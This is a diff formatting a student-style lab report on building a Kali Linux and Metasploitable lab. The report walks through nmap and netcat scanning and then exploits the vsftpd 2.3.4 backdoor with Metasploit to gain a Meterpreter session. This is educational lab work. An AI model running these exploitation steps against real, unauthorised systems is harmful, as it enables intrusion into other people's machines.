@@ -4,6 +4,8 @@
 
 To set up a basic cybersecurity lab using Kali Linux and Metasploitable, and perform scanning and exploitation.
 
+---
+
 ## Tools Used
 
 * VirtualBox
@@ -13,6 +15,8 @@ To set up a basic cybersecurity lab using Kali Linux and Metasploitable, and per
 * Netcat
 * Metasploit
 
+---
+
 ## Lab Setup
 
 * Installed VirtualBox
@@ -20,12 +24,16 @@ To set up a basic cybersecurity lab using Kali Linux and Metasploitable, and per
 * Added Metasploitable (Target Machine)
 * Configured Host-only Network for communication
 
+---
+
 ## Steps Performed
 
 ### 1. Network Verification
 
-* Checked IP address using "ifconfig"
-* Verified connectivity using "ping"
+* Checked IP address using `ifconfig`
+* Verified connectivity using `ping`
+
+---
 
 ### 2. Scanning
 
@@ -36,6 +44,9 @@ nmap -sS <target-ip>
 ```
 
 * Identified open ports such as FTP, SSH, HTTP
+
+---
+
 ### 3. Service Testing
 
 * Used Netcat to check open ports
@@ -53,13 +64,14 @@ nc -zv <target-ip> 80
 
 Steps:
 
-1)msfconsole
-2)search vsftpd
-3)use exploit/unix/ftp/vsftpd_234_backdoor
-4)set RHOSTS <target-ip>
-5)set LHOST <your-ip>
-6)exploit
-
+```
+msfconsole
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS <target-ip>
+set LHOST <your-ip>
+exploit
+```
 
 * Gained Meterpreter session
 * Verified access using:
@@ -67,6 +79,8 @@ Steps:
 ```
 whoami
 ```
+
+---
 
 ## Output
 
